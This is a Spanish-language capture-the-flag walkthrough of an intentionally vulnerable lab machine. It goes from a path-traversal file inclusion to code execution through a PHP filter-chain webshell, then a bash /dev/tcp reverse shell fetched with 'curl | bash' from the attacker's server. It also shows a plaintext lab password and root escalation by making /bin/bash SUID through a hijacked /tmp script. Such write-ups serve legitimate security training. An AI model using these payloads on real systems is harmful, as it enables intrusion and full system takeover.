## Reconocimiento:

Puerto 80 : HTTP

Tenemos una web de tipo “Misión Secreta”, dentro hay un login pero no sirve. 

Por el nombre de la máquina es evidente la vulnerabilidad, así que fuzzeo las páginas php principales para encontrar un payload y funciona con index.php:

```bash
ffuf -u URL/index.php?FUZZ=/etc/passwd -w WORDLIST -fs 978
```

Encuentro el parámetro “search” y lo ejecuto en el buscador:

```bash
http://172.17.0.2/index.php?search=../../../../../etc/passwd
```

Funciona, 

Vamos a utilizar wrappers para hacer un parámetro llamado CMD y obtener una shell:

```bash
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

Genera un contenido muy extenso que citare como “Content_Generate”.

Lo copio y pego en la url ya modificada:

```bash
URL = http://<IP>/index.php?cmd=whoami&search=<CONTENT_GENERATE>
```

Se ve que es el usuario www-data, lo suyo es “intercambiar” el archivo index por uno malicioso con la herramienta Curl de la maquina victima, así que toca mandarnos la shell:

```bash
nano index.html

#Contenido del nano:

#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Donde tengo el archivo abrir servidor de python:

```bash
python3 -m http.server 80
```

Luego:

```bash
nc -nlvp PORT
```

Y ejecutar desde la URL:

```bash
URL = http://<IP>/index.php?cmd=curl http://<IP>/ | bash&search=<CONTENT_GENERATE>
```

Y recibo conexión.

## Escalada www-data → lin

```bash
cd /var/www
ls -la
```

Vemos archivos secretos, en entre ellos un directorio 

```bash
cd .secret_www-data/
cd .passwd
```

Dentro hay un archivo txt con la contraseña:

```bash
cat passwords.txt
lin:agentelinsecreto
```

## Escalada lin → root

```bash
cd /home/lin
cat system.py
```

Hay un archivo python que al ejecutar el modulo “subthreads” da un error. Investigando sobre el modulo resulta que es raro o no es muy común, así que lo busco en el sistema:

```bash
find / -name 'subthreads*' 2>/dev/null
```

Se ve que hay un .py del módulo 

```bash
cat /usr/local/lib/python3.12/dist-packages/subthreads.py
```

Se ve que llama aun archivo en la carpeta /tmp que se ejecuta con sudo y que no existe, así que lo creo:

```bash
cd /tmp
nano script.sh

#!/bin/bash
chmod u+s /bin/bash
```

Le damos permisos de ejecución:

```bash
chmod +x /tmp/script.sh
```

Volvemos a ejecutar el archivo “system.py”, le damos a la opción de subthreads y me salgo.

La bash tendría que tener permisos SUID:

```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash

bash -p
```

Listo.
